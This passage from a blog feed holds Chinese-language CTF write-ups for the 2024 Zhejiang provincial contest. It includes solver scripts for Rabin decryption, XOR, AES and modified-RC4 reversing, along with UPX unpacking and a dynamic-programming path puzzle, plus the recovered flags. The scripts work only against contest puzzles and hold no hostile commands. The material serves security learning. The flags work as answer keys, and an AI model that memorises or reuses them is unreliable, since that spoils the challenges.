class="hljs-built_in">print</span>(p)<br>q=n//p<br><span class="hljs-built_in">print</span>(q)<br><br>inv_p = invert(p, q)<br>inv_q = invert(q, p)<br><br>cs = [c]<br>lge = math.log(e, <span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(lge)):<br>    ps = []<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> cs:<br>        r = <span class="hljs-built_in">pow</span>(c2, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>        s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><br>        x = (r * inv_q * q + s * inv_p * p) % n<br>        y = (r * inv_q * q - s * inv_p * p) % n<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(x)<br>        <span class="hljs-keyword">if</span> n - x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - x)<br>        <span class="hljs-keyword">if</span> y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(y)<br>        <span class="hljs-keyword">if</span> n - y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - y)<br>    cs = ps<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> cs:<br>    flag=long_to_bytes(m)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="FinalSign"><a href="#FinalSign" class="headerlink" title="FinalSign"></a><strong>FinalSign</strong></h2><p>å¾—åˆ°çš„å­—ç¬¦ä¸²å°è¯•è½¬åŒ–æˆ16è¿›åˆ¶ï¼Œå»å¼‚æˆ–DASCTFï¼Œçœ‹åˆ°hellowï¼ŒçŒœæµ‹å¾ªç¯å¼‚æˆ–çš„å­—ç¬¦ä¸²æ˜¯helloworldï¼Œå¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;2c243f2f3b3114345d0a0909333f06100143023b2c55020912&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-comment"># for i in range(0,len(s),2):</span><br><span class="hljs-comment">#     print(int(s[i:i+2],16),end=&quot;,&quot;)</span><br>a=[<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">47</span>,<span class="hljs-number">59</span>,<span class="hljs-number">49</span>,<span class="hljs-number">20</span>,<span class="hljs-number">52</span>,<span class="hljs-number">93</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">51</span>,<span class="hljs-number">63</span>,<span class="hljs-number">6</span>,<span class="hljs-number">16</span>,<span class="hljs-number">1</span>,<span class="hljs-number">67</span>,<span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">44</span>,<span class="hljs-number">85</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">18</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>s1=<span class="hljs-string">&#x27;helloworld&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-built_in">ord</span>(s1[i%<span class="hljs-built_in">len</span>(s1)])),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-comment">#print(i)</span><br><br><span class="hljs-comment">#DASCTF&#123;F1nal_Sign1n_D0ne&#125;</span><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯snowæ— å¯†é’¥è§£å¯†å¾—åˆ°å¼‚æˆ–çš„å­—ç¬¦ä¸²helloworld</p><h1 id="ä¿¡åˆ›å®‰å…¨"><a href="#ä¿¡åˆ›å®‰å…¨" class="headerlink" title="ä¿¡åˆ›å®‰å…¨"></a>ä¿¡åˆ›å®‰å…¨</h1><h2 id="easy-hpp-1"><a href="#easy-hpp-1" class="headerlink" title="easy_hpp-1"></a>easy_hpp-1</h2><p>ä¸¤æ¬¡è§£å‹å¾—åˆ°modules.abc</p><p>å‘ç°aeså’Œbase64ï¼Œæ²¡å‘ç°å¯†æ–‡ï¼Œäº‹åæƒ³åˆ°è¦æœç´¢ç­‰å·</p><p>çœ‹åˆ°zjuctfä¸€çœ¼åŸé¢˜ä½†æ˜¯æ²¡åšè¿‡</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225876017-fa7b8439-a9cc-4656-8e81-c7a4b94c6351-17649900290851.png" class="" title="img"><p>ä¹Ÿæ²¡æœ‰soæ–‡ä»¶ï¼Œæ¯”èµ›çš„æ—¶å€™å°±å¡ä½äº†</p><p>å¤ç°çš„æ—¶å€™æ‰¾åˆ°å‡ ä¹åŸé¢˜ï¼Œå°±æ˜¯åŠ å¯†æœ‰äº›ä¸ä¸€æ ·</p><p><a href="https://note.gopoux.cc/ctf/writeups/zjuctf2024/#easy-hap">Writeups - GoPoux çš„ç¬”è®°æœ¬</a></p><p>ä¸‹è½½èƒ½åç¼–è¯‘abcçš„jadxï¼Œæ‰¾åˆ°çœŸæ­£çš„å¯†æ–‡</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227678288-be3367f8-7cae-490e-996d-8bdaddbfedc9-17649900290863.png" class="" title="img"><p>initå‡½æ•°è®¾ç½®å¥½ç®—æ³•å’Œå…±åŒçš„keyï¼ŒencryptXå¯¹åº”aes_ecbï¼ŒencryptYå¯¹åº”aes_cbc</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763016632224-687373fc-070e-49a2-94df-b98fef850e1f.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763016670712-e26d291d-7c8e-4453-9016-51bcf6842c80.png" class="" title="img"><p>æ€»ä½“è°ƒç”¨é€»è¾‘ä¸ºencrypt-&gt;encryptX-&gt;encryptY-&gt;encodeX-&gt;encodeY</p><p>encryptæŠŠæ˜æ–‡åˆ†æˆå‰åå„16å­—èŠ‚</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227844917-92dd5a58-0535-4856-a625-c3fa78c7996b-17649900290867.png" class="" title="img"><p>aes_cbcçš„ivä¸ºaes_ecbçš„åŠ å¯†ç»“æœ</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763017320083-2b425d33-29df-4230-980e-35d5ef5f5173.png" class="" title="img"><p>encodeXæŠŠaes_cbcåŠ å¯†çš„å¯†æ–‡æ”¾åˆ°å‰é¢ï¼ŒæŠŠä¸¤ä¸ªå¯†æ–‡å¼‚æˆ–åå¾—åˆ°çš„å€¼æ”¾åˆ°åé¢ï¼ŒencodeYä¸ºbase64</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227949424-99d221f2-cc73-4443-8538-760b3e074dd0-176499002908610.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_uint8_array</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> np.array([<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s], dtype=np.uint8)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeX</span>(<span class="hljs-params">arg0, arg1</span>):<br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        res.append(arg1[i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        res.append(arg0[i] ^ arg1[i])<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeY</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(arg)).decode()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeY</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> base64.b64decode(arg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeX</span>(<span class="hljs-params">res</span>):<br>    arg1 = res[:<span class="hljs-number">16</span>]<br>    arg0 = res[<span class="hljs-number">16</span>:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        arg0[i] ^= arg1[i]<br>    <span class="hljs-keyword">return</span> arg0, arg1<br><br>commonCipherKey = string_to_uint8_array(<span class="hljs-string">&quot;DASCTF2024-OHAPP&quot;</span>).tobytes()<br><br>code = <span class="hljs-string">&quot;/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=&quot;</span><br><br>tmp4 = code<br><br>tmp3 = decodeY(tmp4)<br>tmp3 = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> tmp3]<br><span class="hljs-comment"># print(tmp3)</span><br><br>tmp1, tmp2 = decodeX(tmp3)<br>tmp1 = <span class="hljs-built_in">bytes</span>(tmp1)<br>tmp2 = <span class="hljs-built_in">bytes</span>(tmp2)<br><br>cipherY = AES.new(commonCipherKey, AES.MODE_CBC, iv=tmp1)<br>slice2 = cipherY.decrypt(tmp2)<br><span class="hljs-comment"># print(slice2)</span><br><br>cipherX = AES.new(commonCipherKey, AES.MODE_ECB)<br>slice1 = cipherX.decrypt(tmp1)<br><span class="hljs-comment"># print(slice1)</span><br><br>flag = slice1+ slice2<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;DASCTF&#123;Ea5Y_ohaPp_&amp;_5iMPl3_fl4g&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç†æ¸…æ€è·¯å¯ä»¥ç›´æ¥å€ŸåŠ©cyberchefå¤„ç†</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763017642813-a8981e62-0b33-4c90-bdb8-d52b20f188da.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">result2_hex = <span class="hljs-string">&#x27;fda3d1f84f304bdf976c53147e6f0d69&#x27;</span><br>xor_result_hex = <span class="hljs-string">&#x27;c1e93f5f74a5fe71691f3e3089bff20c&#x27;</span><br><br>result2_bytes = <span class="hljs-built_in">bytes</span>.fromhex(result2_hex)<br>xor_result_bytes = <span class="hljs-built_in">bytes</span>.fromhex(xor_result_hex)<br><br>result1_bytes = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(result2_bytes, xor_result_bytes))<br><br><span class="hljs-built_in">print</span>(result1_bytes.<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#3c4aeea73b95b5aefe736d24f7d0ff65</span><br></code></pre></td></tr></table></figure><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763019012231-0819a3e3-25a9-414f-8639-8599c2b47050.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763019094538-e88d9963-7b2d-45d3-87d9-39d3cb7b7fbd.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>aesé­”æ”¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2024åˆèµ›wp</title>
    <link href="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>ä¸ªäººæ„Ÿè§‰ä»Šå¹´çš„åˆèµ›reæ²¡ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯éš¾é¢˜æ²¡æœ‰å‰å‡ å¹´çš„éš¾</p><h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>010å‘ç°æ˜¯pycæ–‡ä»¶</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530532230-c314f28c-7595-41b5-aaab-a3b3994304a9.png" class="" title="img"><p>nndï¼Œpycdcåç¼–è¯‘ä¸äº†ï¼Œå¯èƒ½æ˜¯pycæ–‡ä»¶è¢«æ”¹äº†</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530600492-1d05780d-c925-4093-b3c5-6a37390ecf2b.png" class="" title="img"><p>åªèƒ½ç”¨pycdasï¼Œå…ˆå¯¹keyè¿›è¡Œå¼‚æˆ–</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530746479-272c9598-a487-4779-bedd-56f9ef9d875c.png" class="" title="img"><p>ç±»ä¼¼rc4ä½†æ˜¯åªç”Ÿæˆäº†å¯†é’¥æµï¼Œå¹¶æ²¡æœ‰å¼‚æˆ–å¯†æ–‡</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530796207-c4e25106-29c9-42a9-9be8-2b7313acf280.png" class="" title="img"><p>åç»­å¼‚æˆ–keyå’Œ51</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530834754-9bcdad5f-f2ac-4522-abdb-1ecd30dff7b0.png" class="" title="img"><p>æœ€åæ˜¯base64</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730530895312-c4ac9893-52e8-45a0-a6cf-5508a554efde.png" class="" title="img"><p>é€†çš„æ—¶å€™å¼‚æˆ–å¯†æ–‡å¯ä»¥æ”¾åœ¨æœ€åï¼Œä¸èƒ½åç¼–è¯‘çœŸæ¶å¿ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">&#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;</span><br>ciphertext = base64.b64decode(encoded).decode()<br>key = <span class="hljs-string">&#x27;7e021a7dd49e4bd0837e22129682551b&#x27;</span><br><br>s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br>key = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">102</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key] <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + s[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>    s[i], s[j] = s[j], s[i]<br><br>i = j = <span class="hljs-number">0</span><br>data = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    j = (j + s[i]) % <span class="hljs-number">256</span><br>    s[i], s[j] = s[j], s[i]<br>    k = s[(s[i] + s[j]) % <span class="hljs-number">256</span>]<br>    data.append(k)<br><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(ciphertext, data):<br>    result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) ^ k ^ <span class="hljs-number">51</span>)<br><br><span class="hljs-built_in">print</span>( result)<br></code></pre></td></tr></table></figure><h2 id="Midmath"><a href="#Midmath" class="headerlink" title="Midmath"></a>Midmath</h2><p>ä¿®æ”¹ç‰¹å¾ç DASä¸ºUPX</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730529059899-0a44cdb8-3f45-4368-a978-6f89acb66e5e.png" class="" title="img"><p>ç„¶åè„±å£³</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730528952066-2552698f-67a7-41cd-8452-55563439a58d.png" class="" title="img"><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730529025066-510388d4-53b5-4a7c-aaf5-33b79e4a2eb9.png" class="" title="img"><p>å‘ç°æ˜¯æ‰¾æœ€å¤§è·¯å¾„ï¼Œç”¨åŠ¨æ€è§„åˆ’åš</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SUM 6668912</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">510</span>][<span class="hljs-number">510</span>], f[<span class="hljs-number">510</span>][<span class="hljs-number">510</span>], path[<span class="hljs-number">510</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span>;<br>    FILE *fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot;%d&quot;</span>, &amp;a[x][y]) != EOF) &#123;<br>        <span class="hljs-keyword">if</span> (x == y) &#123;<br>            y = <span class="hljs-number">1</span>;<br>            x++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        y++;<br>    &#125;<br>    <span class="hljs-built_in">fclose</span>(fp);<br>    x--; <br><br><br>    f[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) &#123;<br><br>            f[i][j] = f[i - <span class="hljs-number">1</span>][j] + a[i][j];<br>            <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">1</span>) &#123;<br>                f[i][j] = <span class="hljs-built_in">max</span>(f[i][j], f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + a[i][j]); <br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-keyword">if</span> (f[x][i] &gt; MAX_SUM) &#123;<br>            <span class="hljs-type">int</span> cx = x, cy = i;<br>            <span class="hljs-keyword">while</span> (cx &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">if</span> (f[cx][cy] == f[cx - <span class="hljs-number">1</span>][cy] + a[cx][cy]) &#123;<br>                    path[cx] = <span class="hljs-number">1</span>; <br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    path[cx] = <span class="hljs-number">2</span>; <br>                    cy--;<br>                &#125;<br>                cx--;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, path[i]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>***<br><span class="hljs-number">2121111112222111112111111111112121211221122121111121122222222222212222122122212121111121122111121111111112211121221111222222222212111122221111211111221122111111121121212112211222121222222222112222111122222121222222222212211111111211112112212112222111211222122222122222222212221222212122211211222122221121222121212112112212121122111121122111221221221111121211211112122222211111212122221222222112111112122221111121221111111111111112111211111122122111111111111211212122212222111222212212111121112221211</span><br>***<br></code></pre></td></tr></table></figure><p>æœ€åè¾“å‡º16è¿›åˆ¶å°å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>data = <span class="hljs-string">&quot;2121111112222111112111111111112121211221122121111121122222222222212222122122212121111121122111121111111112211121221111222222222212111122221111211111221122111111121121212112211222121222222222112222111122222121222222222212211111111211112112212112222111211222122222122222222212221222212122211211222122221121222121212112112212121122111121122111221221221111121211211112122222211111212122221222222112111112122221111121221111111111111112111211111122122111111111111211212122212222111222212212111121112221211&quot;</span><br><br>md5_full = hashlib.md5(data.encode()).hexdigest()<br>md5_16 = md5_full[<span class="hljs-number">8</span>:<span class="hljs-number">24</span>]<br><br><span class="hljs-built_in">print</span>(md5_16)<br><span class="hljs-comment">#f4135424cb2f161c</span><br></code></pre></td></tr></table></figure><h2 id="MidRe-1"><a href="#MidRe-1" class="headerlink" title="MidRe-1"></a>MidRe-1</h2><p>æœ‰èŠ±æŒ‡ä»¤</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730529497849-dc9548f8-de42-4755-9585-0bab8762daee.png" class="" title="img"><p>ä¸­é—´ä¸€æ®µå§‹ç»ˆæ— æ³•å¤„ç†ï¼Œä½¿å¾—congratulatuionæ˜¾ç¤ºåœ¨mainä¸­</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730598130325-7584167f-39d6-4700-9e71-330f98d97ae8.png" class="" title="img"><p>ä¸€å¼€å§‹å¯¹è¾“å…¥æœ‰å¾ªç¯å¼‚æˆ–</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730599079070-23f82f1e-3d0a-4f25-9637-ea927a61c183.png" class="" title="img"><p>å¾€ä¸Šç¿»æ‰¾åˆ°ä¸¤ä¸ªå­—ç¬¦ä¸²</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730598205905-87a2ece3-597a-4bbc-be6d-674d3cf4534a.png" class="" title="img"><p>ç¬¬ä¸€ä¸ªæ˜¯keyï¼Œç¬¬äºŒä¸ªæ˜¯iv</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730598770313-5dd1aff8-2acb-4551-aa53-e1fa2e8f88e5.png" class="" 